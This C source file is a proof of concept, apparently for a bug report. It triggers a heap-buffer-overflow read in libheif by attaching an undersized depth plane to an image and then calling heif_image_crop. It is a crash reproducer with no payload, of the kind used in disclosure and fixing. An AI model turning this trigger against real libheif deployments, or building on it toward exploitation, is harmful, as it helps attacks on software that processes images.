/* PoC for a heap-buffer-overflow reachable through the public libheif API.
 *
 * Builds a 16x16 YCbCr 4:2:0 heif_image and attaches an auxiliary
 * "depth" data-channel plane. A depth/disparity/filter_array plane is
 * documented to cover the full image geometry (same as Y), but this
 * PoC allocates it at the chroma-subsampled 8x8 size instead. It then
 * calls the public heif_image_crop() API, which internally trusts the
 * plane to be the standard (full) size once the geometry gate accepts
 * it, and reads past the end of the undersized buffer.
 */

#include <libheif/heif.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void)
{
  /* Large enough that the chroma-subsampled (undersized) depth plane
   * allocation is not absorbed by the small-plane 64x64 rounding floor
   * in HeifPixelImage::ComponentStorage::alloc(). */
  const int width = 256;
  const int height = 256;

  heif_image* img = NULL;
  heif_error err = heif_image_create(width, height, heif_colorspace_YCbCr, heif_chroma_420, &img);
  if (err.code != heif_error_Ok) {
    fprintf(stderr, "heif_image_create failed: %s\n", err.message);
    return 1;
  }

  err = heif_image_add_plane(img, heif_channel_Y, width, height, 8);
  if (err.code != heif_error_Ok) {
    fprintf(stderr, "add Y plane failed: %s\n", err.message);
    return 1;
  }

  int chroma_w = width / 2;
  int chroma_h = height / 2;

  err = heif_image_add_plane(img, heif_channel_Cb, chroma_w, chroma_h, 8);
  if (err.code != heif_error_Ok) {
    fprintf(stderr, "add Cb plane failed: %s\n", err.message);
    return 1;
  }

  err = heif_image_add_plane(img, heif_channel_Cr, chroma_w, chroma_h, 8);
  if (err.code != heif_error_Ok) {
    fprintf(stderr, "add Cr plane failed: %s\n", err.message);
    return 1;
  }

  /* Undersized auxiliary plane: chroma_w x chroma_h instead of the full
   * width x height that a depth channel is supposed to cover. */
  err = heif_image_add_plane(img, heif_channel_depth, chroma_w, chroma_h, 8);
  if (err.code != heif_error_Ok) {
    fprintf(stderr, "add depth plane failed: %s\n", err.message);
    return 1;
  }

  {
    int stride = 0;
    uint8_t* p = heif_image_get_plane(img, heif_channel_Y, &stride);
    memset(p, 0x11, (size_t) stride * height);

    p = heif_image_get_plane(img, heif_channel_Cb, &stride);
    memset(p, 0x22, (size_t) stride * chroma_h);

    p = heif_image_get_plane(img, heif_channel_Cr, &stride);
    memset(p, 0x33, (size_t) stride * chroma_h);

    p = heif_image_get_plane(img, heif_channel_depth, &stride);
    memset(p, 0x44, (size_t) stride * chroma_h);
  }

  /* heif_image_crop()'s left/right/top/bottom are margins to remove, so
   * all-zero margins keep the full image extent. The depth channel's
   * per-row copy is then computed from the full width/height, not the
   * chroma-subsampled plane that was actually allocated for it. */
  err = heif_image_crop(img, 0, 0, 0, 0);
  if (err.code != heif_error_Ok) {
    fprintf(stderr, "heif_image_crop failed: %s\n", err.message);
    heif_image_release(img);
    return 1;
  }

  printf("no crash (unexpected)\n");
  heif_image_release(img);
  return 0;
}
